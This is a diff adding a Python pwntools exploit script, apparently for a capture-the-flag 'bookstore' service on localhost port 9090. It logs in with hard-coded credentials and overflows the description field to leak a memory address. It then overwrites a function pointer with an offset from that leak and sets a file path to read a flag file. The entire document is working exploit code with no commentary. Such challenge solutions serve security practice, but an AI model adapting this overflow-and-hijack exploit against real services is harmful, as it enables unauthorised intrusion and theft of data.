@@ -1,0 +1,112 @@
+from pwn import * 
+from time import *
+
+r=remote('127.0.0.1',9090)
+
+print r.recvuntil('ID : ')
+r.sendline('helloadmin')
+print r.recvuntil('RD : ')
+r.sendline('iulover!@#$')
+
+#############################add new item##############
+
+print r.recvuntil('> ')
+
+r.sendline('1')	#add new item
+print r.recvuntil(' : ')
+r.sendline('1') #bookname
+print r.recvuntil(' : ')
+r.sendline('1') #description
+print r.recvuntil('EBook)')
+r.sendline('0') #type
+
+############################modify 0 start###############
+
+print r.recvuntil('> ')
+r.sendline('2')
+print r.recvuntil('No : ')
+r.sendline('0')
+
+############################modify information###################
+
+print r.recvuntil('menu!')
+r.sendline('3')
+print r.recvuntil(' : ')
+r.sendline('2147483647')
+print r.recvuntil(' : ')
+r.sendline('2147483647')
+print r.recvuntil('not)')
+r.sendline('0')
+print r.recvuntil('Set Avaliable :')
+r.sendline('1')
+print r.recvuntil('Input new bookname')
+r.sendline('1'*20)
+print r.recvuntil('Input new description')
+r.sendline('1'*300)
+
+###################################################################
+###################################################################
+########################leak start#################################
+###################################################################
+###################################################################
+
+print r.recvuntil('menu!')
+r.sendline('0')
+print r.recvuntil('> ')
+r.sendline('4')
+print r.recvuntil('name : ')
+print r.recv(28)
+leak=u32(r.recv(4))
+print hex(leak)
+
+#############################modify 0 start###############
+
+print r.recvuntil('> ')
+r.sendline('2')
+print r.recvuntil('No : ')
+r.sendline('0')
+
+############################modify description##############
+
+print r.recvuntil('menu!')
+r.sendline('2')
+print r.recv()
+print "func : "+hex(leak-0xd2)
+r.sendline('A'*2672+p32(leak-0xd2))
+
+############################modify information###################
+
+print r.recvuntil('menu!')
+r.sendline('3')
+print r.recvuntil(' : ')
+r.sendline('1')
+print r.recvuntil(' : ')
+r.sendline('1')
+print r.recvuntil('not)')
+r.sendline('0')
+print r.recvuntil('Set Avaliable :')
+r.sendline('1')
+print r.recvuntil('Input new bookname')
+r.sendline('/home/bookstore/f'+'\x00')
+print r.recvuntil('Input new description')
+r.sendline('1')
+
+#########################modify shipping########################
+
+print r.recvuntil('menu!')
+r.sendline('4')
+print r.recvuntil('shipping)')
+print "modify shipping"
+r.sendline('1')
+print r.recvuntil('menu!')
+r.sendline('0')
+
+########################view#################
+
+print r.recvuntil('> ')
+r.sendline('3')
+print r.recvuntil('Input No : ')
+r.sendline('0')
+print r.recv()
+sleep(0.1)
+print r.recv()
